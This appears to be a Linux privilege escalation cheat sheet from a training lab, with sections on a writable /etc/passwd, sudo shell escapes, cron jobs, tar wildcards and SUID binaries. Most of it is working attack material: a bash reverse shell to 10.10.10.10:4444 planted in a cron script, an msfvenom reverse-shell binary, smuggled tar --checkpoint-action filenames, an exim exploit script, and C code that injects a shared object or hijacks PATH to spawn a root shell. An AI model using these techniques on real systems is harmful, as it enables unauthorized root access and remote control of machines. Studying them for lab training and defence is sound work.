## Table of Contents

- [Weak File Permissions - Writable /etc/passwd](#weak\file\permissions\-\writable\/etc/passwd)
- [Sudo - Shell escape sequences](#sudo\-\shell\escape\sequences)
- [Cron jobs (File Permissions)](#cron\jobs\(file\permissions))
- [Cron Job wild cards](#cron\job\wild\cards)
- [SUID/SGID executables - Known Exploits](#suid/sgid\executables\-\known\exploits)
- [SUID/SGID executables - Shared Object Injection](#suid/sgid\executables\-\shared\object\injection)
- [SUID/SGID executables - Environment Variables](#suid/sgid\executables\-\environment\variables)


# Weak File Permissions - Writable /etc/passwd
The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some version of linux will still allow password hashes to be stored there.

`ls -l /etc/passwd`

Generate a new password hash with a password of your choice:

`openssl passwd newpasswordhere`

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

`su root`

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").  

Now switch to the newroot user, using the new password:

`su newroot`

# Sudo - Shell escape sequences
Run: 
`sudo -l`
Visit https://gtfobins.github.io/ and search for some of the program names, if the program is listed with "sudo" as a function, use it to elevate privileges.
```find -> root
sudo find . -exec /bin/sh \; -quit
```

# Cron jobs (File Permissions)
`cat /etc/crontab`
locate script that runs with sudo permissions and is writable. 
```
ls -l overwrite.sh

[script]
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

[from host machine]
nc -lvnp 4444
*Root Rev shell*
```


# Cron Job wild cards
View the contents of the other cron job script:

`cat /usr/local/bin/compress.sh`

Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.107.61 LPORT=4444 -f elf -o shell.elf ` 
>> transfer the file to /home/user on the target host (scp or webserver)
>
> chmod +x /home/user/shell.elf
> Create these two files in /home/user
>> touch /home/user/--checkpoint=1
>> touch /home/user--checkpoint-action=exec=shell.elf

When tar command in the cronjob runs, the wildcard will expand to include these files, since the filenames are valid tar command line options, tar will recognice them as such and treat them as command line optioins rather than filenames.
`nc -nvlp 4444`  

Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:

`rm /home/user/shell.elf   rm /home/user/--checkpoint=1   rm /home/user/--checkpoint-action=exec=shell.elf`

# SUID/SGID executables - Known Exploits

Find all the SUID/SGID executables:
`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at **/home/user/tools/suid/exim/cve-2016-1531.sh**.

Run the exploit script to gain a root shell:

`/home/user/tools/suid/exim/cve-2016-1531.sh`

# SUID/SGID executables - Shared Object Injection
The **/usr/local/bin/suid-so** SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:

`/usr/local/bin/suid-so`  

Run **strace** on the file and search the output for open/access calls and for "no such file" errors:

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

Create the **.config** directory for the libcalc.so file:

`mkdir /home/user/.config`

Example shared object code can be found at **/home/user/tools/suid/libcalc.c**. It simply spawns a Bash shell. Compile the code into a shared object at the location the **suid-so** executable was looking for it:

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Execute the **suid-so** executable again, and note that this time, instead of a progress bar, we get a root shell.

`/usr/local/bin/suid-so`  

Remember to exit out of the root shell before continuing!
(libcalc.c)
```C

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

# SUID/SGID executables - Environment Variables
The **/usr/local/bin/suid-env** executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:

`/usr/local/bin/suid-env`

Run strings on the file to look for strings of printable characters:

`strings /usr/local/bin/suid-env`

One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:

`gcc -o service /home/user/tools/suid/service.c`

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

`PATH=.:$PATH /usr/local/bin/suid-env`  

Remember to exit out of the root shell before continuing!
(service.c)
```C
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```

